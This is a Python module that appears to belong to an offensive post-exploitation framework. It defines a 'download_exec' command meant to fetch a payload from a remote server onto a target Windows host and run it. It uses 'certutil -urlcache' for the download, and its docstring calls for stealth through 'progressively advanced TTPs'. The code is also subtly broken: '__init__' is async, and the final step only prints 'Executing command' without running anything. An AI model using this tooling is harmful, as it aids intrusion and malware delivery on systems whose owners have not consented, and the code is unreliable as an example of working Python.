from __future__ import annotations

from rich.console import Console
from ..exec import WindowsCommandExecutor
import os
import sys


class DownloadAndExecute(WindowsCommandExecutor):
    """
    A class that will download a file from a remote server and execute it on a Windows system.
    """
    async def __init__(self, console: Console, url: str, destination: str):
        self.url: str = url
        self.destination: str = destination
        console.print(f"Downloading file from {url} to {destination}")
        
    async def help(self, console: Console) -> None:
        """
        Display help information for the command.
        """
        console.print("This command downloads a file from a remote server and executes it on the target Windows host.")
        console.print("Usage: download_exec <url> <destination>")
        console.print(f"Example: download_exec http://{sys.argv[1]} C:\\temp\\payload.exe")
        
    async def execute(self, console: Console, command: str) -> None:
        """execute the command on the Windows host. Optimize the command for stealth where possible, using progressively advanced TTPs.

        Args:
            console (Console): Rich console object
            command (str): the command to execute
        """
        console.print(f"Downloading file from {self.url} to {self.destination}")
        if self.url.startswith("http"):
            try:
                # Download the file using the URL
                os.system(f"certutil -urlcache -split -f {self.url} {self.destination}")
                console.print(f"File downloaded successfully.")
            except Exception as e:
                # Handle any exceptions that occur during file download
                console.print(f"Error downloading file: {e}")
        elif self.url.startswith("file"):
            try:
                # Copy the file from the local system
                os.system(f"copy {self.url} {self.destination}")
                console.print(f"File copied successfully.")
            except Exception as e:
                # Handle any exceptions that occur during file copy
                console.print(f"Error copying file: {e}")
        elif self.url.startswith("\\\\"):
            try:
                # Copy the file from a network share
                os.system(f"copy {self.url} {self.destination}")
                console.print(f"File copied successfully.")
            except Exception as e:
                # Handle any exceptions that occur during file copy
                console.print(f"Error copying file: {e}")
        else:
            console.print(f"Invalid URL provided: {self.url}")
            return
        console.print(f"Executing command: {command}")
        